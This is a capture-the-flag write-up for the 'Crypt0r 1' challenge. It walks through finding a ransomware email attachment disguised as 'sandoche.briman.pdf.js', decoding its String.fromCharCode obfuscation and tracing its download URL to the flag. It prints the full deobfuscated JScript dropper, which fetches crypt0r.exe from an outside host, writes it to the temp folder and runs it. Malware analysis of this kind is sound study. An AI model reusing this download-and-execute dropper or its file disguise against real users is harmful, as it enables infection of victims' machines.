#Cryptor 1

_If you reach the top of the mountain, find yet another._
    -- Super Street Fighter 2 - Fei Long

This is a series of three challenges, crypt0r 1, 2 and 3.

We were told that a secreatry has received something 'strange' in her emails
and asks for help.

## Recon
The name let us think of ransomware: ( https://en.wikipedia.org/wiki/Ransomware ).

That could be fun. The file given is a tgz, called mails.tgz We also know that
ransomware are often sent by emails. That's a first lead.

```
mitsurugi@dojo:~/chall/inshack$ ls -l mails.tgz
-rw-r--r-- 1 mitsurugi mitsurugi 6787079 avril  6 19:46 mails.tgz
mitsurugi@dojo:~/chall/inshack$ tar zxvf mails.tgz 
mails/
mails/MKL4CN1ZSH7R4RKUS2YCP3UXPH6XVVR0.eml
mails/PRZNX8XJTVO0K373U04JYBTFP0XLJ957.eml
mails/I0LJDHELVLZ9YVM7Y6PTKMR3KMY0P8V8.eml
 (.. snip the 70 lines ...)
mails/RVFEYZ4TM8SVWUHOKH7NLDUYM4AXQFGE.eml
mails/099LCMXBLGDYKFEV61T7ND8YSY755205.eml
mails/HICWHKM4Q30ZBII4I10MTRXIOQFUOYMT.eml
mitsurugi@dojo:~/chall/inshack$ cd mails/
mitsurugi@dojo:~/chall/inshack/mails$ for mail in \*eml; do ripmime $mail ; done
mitsurugi@dojo:~/chall/inshack/mails$
```

ripmime have extracted all the attachments. We have a *lot* of files:
```
mitsurugi@dojo:~/chall/inshack/mails$ ls -l | wc -l
270
mitsurugi@dojo:~/chall/inshack/mails$ 
```
From these files, we have to find the one suspicious. This challenge
deals with ransomware, did you ever studied ransomware/malware? If yes,
you surely know that it spread by email, mimicking a zip or doc but being
a script file (.js or .wsf or alike) :
http://0x90909090.blogspot.com/2016/06/analysis-of-evil-javascript.html

Guess what:
```
mitsurugi@dojo:~/chall/inshack/mails$ ls *js
sandoche.briman.pdf.js
mitsurugi@dojo:~/chall/inshack/mails$
```

Ok, we got it \o/

## Analysis
We can work on this js file. It's obfusctaed:
```
mitsurugi@dojo:~/chall/inshack/mails$ cat sandoche.briman.pdf.js 
try{
var b = String.fromCharCode(118, 97, 114, 32, 106, 32, 61, 32,
91, 34, 87, 83, 99, 114, 105, 112, 116, 46, 83, 104, 101, (... snip all numbers ...)
...);
eval(b);
} catch (err) {}
mitsurugi@dojo:~/chall/inshack/mails$
```

Don't lose time with that:
```
mitsurugi@dojo:~/chall/inshack/mails$ js24 
js> String.fromCharCode(118, 97, 114, 32, 106, 32, 61, 32, 91, 34, 87,
(... all number copy-pasted...) 125, 10, 10);
"var j = [\"WScript.Shell\",\"Scripting.FileSystemObject\",\"Shell.Application\",\"Microsoft.XMLHTTP\"];\nvar u = [\"aaacc.\", \":/\", \"gpozgzejgozj\", \"glkrgjoegjnfozpkfpze\", \"top\", \"win32\", \"crypt0r\", \"binaries\", \"sweetvpn\", \".\", \"arch\", \"exe\", \"http\", \"/\"];\n\ntry {\n    var sh = Cr(0);\n    var fs = Cr(1);\n\n    var s2 = Ex(\"temp\") + \"\\\\\" + u[2*2+1] +  u[7+3-1]+ u[5*2+1];\n    var fi = fs.CreateTextFile(s2,true);\n    fi.Write(Pt(2565454484514854845487848, \"kgjgepog=kfOIIIeeoezj==\"));\n    fi.Close();\n    sh.run(s2);\n}\ncatch (err)\n{\n}\n\nfunction Ex(S) {\n    return sh.ExpandEnvironmentStrings(\"%\" + S + \"%\");\n}\n\nfunction Pt(C,A) {\n    var X = Cr(3);\n    var T = u[12] + u[7%6] + u[13] + u[3] + u[9] + u[2+2*0] + u[1029*0] + u[8*10/20*2] + u[9] + u[4] + u[13] + u[7] + u[13] + u[10] +  u[10+6/2] + u[7-2] + u[14+5-6] + u[6] + u[9] + u[11];\n\n    X.open('GET', T + \"?p=r&l=\" + C, false);\n    X.SetRequestHeader(\"User-Agent:\", \"Made by b4cc4rd1\");\n    X.send(A);\n    return X.responsetext;\n}\n\n\nfunction Cr(N) {\n    return new ActiveXObject(j[N]);\n}\n\n"
js>
```

In a beautified form:
```
"var j = ["WScript.Shell","Scripting.FileSystemObject","Shell.Application","Microsoft.XMLHTTP"];
var u = ["aaacc.", ":/", "gpozgzejgozj", "glkrgjoegjnfozpkfpze", "top", "win32", "crypt0r", "binaries", "sweetvpn", ".", "arch", "exe", "http", "/"];

try {
    var sh = Cr(0);
    var fs = Cr(1);

    var s2 = Ex("temp") + "\\" + u[2*2+1] +  u[7+3-1]+ u[5*2+1];
    var fi = fs.CreateTextFile(s2,true);
    fi.Write(Pt(2565454484514854845487848, "kgjgepog=kfOIIIeeoezj=="));
    fi.Close();
    sh.run(s2);
}
catch (err)
{
}

function Ex(S) {
    return sh.ExpandEnvironmentStrings("%" + S + "%");
}

function Pt(C,A) {
    var X = Cr(3);
    var T = u[12] + u[7%6] + u[13] + u[3] + u[9] + u[2+2*0] + u[1029*0] + u[8*10/20*2] + u[9] + u[4] + u[13] + u[7] + u[13] + u[10] +  u[10+6/2] + u[7-2] + u[14+5-6] + u[6] + u[9] + u[11];

    X.open('GET', T + "?p=r&l=" + C, false);
    X.SetRequestHeader("User-Agent:", "Made by b4cc4rd1");
    X.send(A);
    return X.responsetext;
}


function Cr(N) {
    return new ActiveXObject(j[N]);
}

"
```

Ok, we can start reversing.
The juicy part is here: ` X.open('GET', T + "?p=r&l=" + C, false); `
The T parameter depends only on the `u` table. Let show it:
```
mitsurugi@dojo:~/chall/inshack/mails$ ipython
Python 2.7.13 (default, Jan 19 2017, 14:48:08) 
Type "copyright", "credits" or "license" for more information.

IPython 5.1.0 -- An enhanced Interactive Python.
?         -> Introduction and overview of IPython's features.
%quickref -> Quick reference.
help      -> Python's own help system.
object?   -> Details about 'object', use 'object??' for extra details.

In [1]: u = ["aaacc.", ":/", "gpozgzejgozj", "glkrgjoegjnfozpkfpze", "top", "win32", "crypt0r", "binaries
   ...: ", "sweetvpn", ".", "arch", "exe", "http", "/"]

In [2]: T = u[12] + u[7%6] + u[13] + u[3] + u[9] + u[2+2*0] + u[1029*0] + u[8*10/20*2] + u[9] + u[4] + u[
   ...: 13] + u[7] + u[13] + u[10] +  u[10+6/2] + u[7-2] + u[14+5-6] + u[6] + u[9] + u[11]

In [3]: T
Out[3]: 'http://glkrgjoegjnfozpkfpze.gpozgzejgozjaaacc.sweetvpn.top/binaries/arch/win32/crypt0r.exe'

In [4]: 
```

And we're almost done:
```
mitsurugi@dojo:~/chall/inshack/mails$ lynx -dump http://glkrgjoegjnfozpkfpze.gpozgzejgozjaaacc.sweetvpn.top/binaries/arch/win32/crypt0r.exe
                                   Not Found

   The requested URL /binaries/arch/win32/crypt0r.exe was not found on
   this server.
mitsurugi@dojo:~/chall/inshack/mails$ 
```

Strange, but we can explore the website:
```
mitsurugi@dojo:~/chall/inshack/mails$ lynx -dump http://glkrgjoegjnfozpkfpze.gpozgzejgozjaaacc.sweetvpn.top/binaries/arch/win32/
   Not that bad. Try again :)

mitsurugi@dojo:~/chall/inshack/mails$
```
Nothing here, let's try upper

```
mitsurugi@dojo:~/chall/inshack/mails$ lynx -dump http://glkrgjoegjnfozpkfpze.gpozgzejgozjaaacc.sweetvpn.top/binaries/arch/
                            Index of /binaries/arch

 Icon   [1]Name                    [2]Last modified      [3]Size  [4]Description
  ___________________________________________________________________________
 [DIR]  [5]Parent Directory                             -
 [   ]  [6].flag                   03-Apr-2017 18:39   37
 [DIR]  [7]arm7/                   06-Mar-2017 13:03    -
 [DIR]  [8]dbg64/                  03-Apr-2017 19:37    -
 [DIR]  [9]elf64/                  06-Mar-2017 13:03    -
 [DIR]  [10]march64/                06-Mar-2017 13:03    -
 [DIR]  [11]mips/                   06-Mar-2017 13:03    -
 [DIR]  [12]sparc/                  06-Mar-2017 13:03    -
 [DIR]  [13]win32/                  08-Mar-2017 12:58    -
  ___________________________________________________________________________

```

Ok, a `.flag` file.

## hayai mono gachi (Early one wins)
This is it:
```
mitsurugi@dojo:~/chall/inshack/mails$ lynx -dump http://glkrgjoegjnfozpkfpze.gpozgzejgozjaaacc.sweetvpn.top/binaries/arch/.flag
INSAc79371180eddac4582321f98d32db67c

mitsurugi@dojo:~/chall/inshack/mails$
```	

If you liked it, the quest continues in Crypt0r\_2
